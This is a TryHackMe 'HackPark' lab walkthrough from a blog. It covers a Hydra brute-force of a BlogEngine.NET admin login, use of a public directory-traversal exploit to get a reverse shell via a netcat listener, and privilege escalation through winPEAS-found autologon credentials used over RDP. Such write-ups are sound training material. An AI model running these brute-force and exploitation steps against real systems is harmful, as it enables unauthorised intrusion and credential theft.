---
title:  "HackPark Writeup - TryHackMe"
date:   2020-07-31 20:00:00 -0400
categories: [THM]
toc: true
comments: false
tags: [bruteforcing, privesc, oscp, hydra, winpeas]
---

This time we will be solving the [HackPark](https://tryhackme.com/room/hackpark) room from [TryHackMe](https://tryhackme.com/). This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey.

## Room info

![Machine Info](/images/THM/HackPark/01-machine-info.png "Machine Info")

## Enumeration

For some reason, nmap is not giving any information about the open ports for this machine, but I'll anticipate that we have ports **80** and **3389** open.

First of all, taking a look of the website ```http://10.10.203.246``` we can see the following landing page:

![Landing Page](/images/THM/HackPark/00-landing-page.png "Landing Page")

Doing a reverse image search on the clown picture, we can tell that is **Pennywise** from IT movie.

Moving on, the next interesting section of the website is the **Log In** panel on the right menu.

![Right Menu](/images/THM/HackPark/02-login.png "Right Menu")

So, we click on **Log In** and get to a login page. In the landing page we see **Blogengine.net** and a typical login form for username and password inputs.

URL: ```http://10.10.203.246/Account/login.aspx```

![Login](/images/THM/HackPark/03-blog-login.png "Login")

As we know, the room description says we'll be using Hydra for bruteforcing. So, before that is important to know what is the default user for **Blogengine**.

After a quick Google research we got **admin** as the default user and from now on just need to obtain the password through brute-forcing with Hydra.

## Gaining access

After having decided to use Hydra, we must know what information to provide to make it work. For brute-forcing a web form the syntax is as follow:

> hydra -l [User] -P [Pass] [Target IP] [Request Method] "[Login form Path]:[Request body]:[Failure message]"

- The user field is ```admin```.
- For the **Pass** field we will be using ```rockyou.txt``` wordlist.
- The target IP is ```10.10.203.246```.
- The login form path will be ```/Account/login.aspx```.

For the rest, we will have to do a little research on the login page. Using the Developer tools from our browser we can see how the login form sends the request.

The network tab will show us the request method whenever we make a submit on the login form. So, let's go ahead and make a request with the following parameters:

- Username: ```usertest```.
- Password: ```passtest```.

![Method](/images/THM/HackPark/03-form-method.png "Method"){: .align-center}

Now we know the form is using **POST** method to make the request, and using the **Edit and Resend** button in the bottom right corner we can see the raw body request. Finally, we also get the message whenever a wrong user/pass is entered: ```Login failed```. 

![Request](/images/THM/HackPark/03-request.png "Request"){: .align-center}

**Request Body**
```bash
__VIEWSTATE=49GAAjlZ%2B4B1%2Bz38DrOFSr7m8aWbh0CXLp8Xr2aPBM2liP4BPRanZv%2Bsnfh62wyJQLsPPiHvYs6oZ5ngezwSDWtN9kSbkJYkqhj%2Fdcvfk0iQv7ShrL9zDiVLHkHAzvF7bEV0%2FgUB5BfJVrw0MFhYcvzn9a0rlmhy8J%2BMjjD53W4mULD4&__EVENTVALIDATION=sXh8q7nd3FnQbnON%2BvVUJwD7BbO7R8oPcmNeBZMWODV4Exie1bp00VsrrcY70IHcnw%2B3oo%2Bgu%2FXsUt2HuFYShgSXZf1qf%2FOosRaywgIUr7HIriKizOiGdSotndccZxhlmHYKGSu9iGAuAQsT5%2BZoAu3zLyGex42pPknzmCQw5%2FRCe%2BUN&ctl00%24MainContent%24LoginUser%24UserName=usertest&ctl00%24MainContent%24LoginUser%24Password=passtest&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

For hydra to work, we need to specify a couple of placeholders for the USER and PASS parameters in the request. If we take a closer look to the raw request, we can see the user and pass entered earlier: 

```plaintext
LoginUser%24UserName=usertest&ctl00%24MainContent%24LoginUser%24Password=passtest
```

So in this case, we replace **usertest** for ```^USER^``` and **passtest** for ```^PASS^```.

```plaintext
LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^
```

**Full command**

After getting all the information, the full command looks like this:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.203.246 http-post-form "/Account/login.aspx:__VIEWSTATE=DuOBP%2BgZJeq6AMydj5niN1uZM%2FDPpZMaxfWo5oEC4brEJy1oBLy29HUrOfHMJVOGXkG1660e6jVooc9Yq08XSwXuS6%2BEAz0wmCd9zrPJ%2FvRTEfvW4%2FydsHFgcUy%2BaIkSagapG4M4u0EK%2FxLTi5gChTWoajmuqFTxAa8qQQJOi7n9k0Fmpfq1MZzahKDFn5OJvCfq6JW%2FQVV4w%2FwQsnL03wpViAbcqU5CAVBTo9igmfmnTanl64dDgoz8ZkXx0sfLD8O136c%2BVm6kcfY3olmQUP34NqflsNH9hVBYr4piqoMqK%2BQjG2SI4cgyyRbcUjLnOryib9veu%2BsGI147wYnLVmnQT1HR0uePIIBJ%2BA3UQJZngtnK&__EVENTVALIDATION=yxXvvmOhIbyz01WxElUbLdtpbMGxCzl5Rt2yC8ppVo8aEkoGj61ik751%2FMdx5Ea6wPF4FA5bjdCtJ%2BJ2terqrBoDEHH8mETsjtorsuBx5xG0AxeHmiNLCZGHt0BDXhVuDeihrfZuN6Wb89YIQvzsLZT4aFAD2DEeuiF3stBpJy%2Bco6jP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -t 60 -V
```
So we launch hydra and in a couple of minutes we get the password for the user admin.

![Hydra bruteforcing](/images/THM/HackPark/02-hydra-BF-blur.png "Hydra bruteforcing"){: .align-center}

Logging in, the first thing to do is find the CMS version, for this we navigate to the About tab on the sidebar menu.

![Blog version](/images/THM/HackPark/03-blog-version.png "Blog version")

With this information, now we proceed to take a look on exploitdb if there is already an exploit or CVE for this CMS. 

![Searchsploit](/images/THM/HackPark/04-searchsploit.png "Searchsploit")


There is indeed an exploit available for our CMS version. Lets take a look to the one named [BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353) and read it carefully.

It is a exploit written in C# which will allow us to get a reverse shell exploiting a vulnerable code in the ```PostList.ascx.cs``` file. To abuse this vulnerability, we have to do the following:

- Edit the exploit with our local IP address and Port for the reverse shell.

![Exploit](/images/THM/HackPark/04-modify-exploit.png "Exploit")

- Set a listener with the same parameters.

```bash
┌─[✗]─[root@parrot]─[/home/hsct/TryHackMe/HackPark]
└──╼ #rlwrap nc -nlvp 443
listening on [any] 443 ...
```

- Rename the exploit as: ```PostView.ascx```.
- In the CMS, navigate to ***Content > Posts > New*** and add a new post uploading our ```PostView.ascx``` file. Click on the open folder icon.

![Exploit Upload 1](/images/THM/HackPark/06-upload-01.png "Exploit Upload 1")
- Upload the exploit using the file manager and add it to the new post.

![Exploit Upload 2](/images/THM/HackPark/06-upload-02.png "Exploit Upload 2")

- Set a title and save it.

![Exploit Upload 3](/images/THM/HackPark/06-upload-03.png "Exploit Upload 3")

- Open the URL: ```http://10.10.203.246/?theme=../../App_Data/files```.

Finally we get the reverse shell.  

```bash
┌─[✗]─[root@parrot]─[/home/hsct/TryHackMe/HackPark]
└──╼ #rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.0.103] from (UNKNOWN) [10.10.203.246] 49428
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

## Privilege Escalation

For privesc we are going to use [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) which is awesome for a quick system scan. We need to make sure to download the correct version of the binary as we are in a x64 machine.

```batch
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard Evaluation
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-10000-00000-AA228
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          7/31/2020, 9:45:02 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
```
With the tool already in the machine, we proceed to run it by simply doing ```winPEAS.exe``` from the console. Then we will take a moment to analyze the output. 

Scrolling through, we reach the following section that looks interesting:

![Autologon Credentials](/images/THM/HackPark/06-credentials-blur.png "Autologon Credentials")

**winPEAS** just found us some autologon credentials from the **Administrator** user, so the next step will be checking this using RDP.

```bash
xfreerdp /u:Administrator /p:4q6Xv******** /v:10.10.203.246
```

![Administrator access](/images/THM/HackPark/07-admin-access.png "Administrator access")

That's it! Now we have Administrator privileges and access to the root flag in the desktop.